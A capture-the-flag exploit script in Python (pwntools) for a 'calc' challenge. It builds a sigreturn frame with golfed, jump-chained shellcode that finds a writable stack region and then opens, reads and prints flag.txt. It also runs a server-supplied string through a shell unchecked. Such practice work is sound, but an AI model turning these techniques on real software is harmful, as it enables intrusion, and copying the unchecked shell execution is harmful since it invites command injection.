#!/usr/bin/env python3

from pwn import *

serv = "chall.lac.tf"
port = 31169

exe = ELF("./calc")
context.arch = "amd64"

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""

            """)
    return r

pl = []
r = conn()

def chain(code, jmp=3):
    code = asm(code).ljust(6, b"\x90") + b"\xeb" + p8(jmp)
    if len(code) > 8:
        print("code in chain too long")
        exit(1)
    pl.append(u64(code))

def main():
    # we can call sigreturn because division sets rax,
    # but we lose stack which we need for orw.
    # we recover it using behavior of write syscall
    # to tell us whether an address is writeable,
    # brute forcing the possible stack address space.
    # the shellcode to do all of this must be golfed
    # to a single sigreturn frame, with rel jumps
    # chaining the 6 byte code blocks.
    # have to choose certain registers to set high values
    # to and others to use as shellcode placement.
    # will take a few seconds to get the flag, with a
    # small chance of failure
    chain("mov eax, edx; mov edi, edx; syscall")
    chain("test rax, rax; jns $+30")
    chain("add rsi, r9; jmp $-25")
    chain("mov rsp, rsi; push 0")
    chain("push r8; push SYS_open; pop rax", jmp=14)
    chain("mov rdi, rsp; xor rsi, rsi")
    chain("push rsi; pop rdx; push rsp; pop rdi; syscall")
    chain("push rax; pop rdi; push r11; pop rdx")
    chain("xor eax, eax; push rsp; pop rsi; syscall")
    chain("push SYS_write; pop rax; push 1")
    chain("pop rdi; syscall")

    frame = SigreturnFrame()
    frame.rip = 0x313370ed
    frame.r8 = u64(b"flag.txt")
    frame.r9 = 0x10000
    frame.r10 = 0x69420
    frame.r11 = pl[10]
    frame.r12 = pl[9]
    frame.r13 = pl[8]
    frame.r14 = pl[7]
    frame.r15 = pl[6]
    frame.rdi = pl[5]
    frame.rsi = 0x7ff000000000
    frame.rbp = pl[4]
    frame.rbx = pl[3]
    frame.rdx = 1
    frame.rax = pl[2]
    frame.rcx = pl[1]
    frame.rsp = pl[0]
    inp = b""
    for v in reversed(frame.values()):
        if v == 0x69420:
            inp += b"15/1;"
        else:
            inp += f"{v};".encode()
    if args.REMOTE:
        r.recvline()
        sol = subprocess.run(r.recvline().decode(), shell=True, stdout=subprocess.PIPE, text=True)
        r.sendafter(b"solution:", sol.stdout.encode())
    r.send(inp)
    r.interactive()

if __name__ == "__main__":
    main()
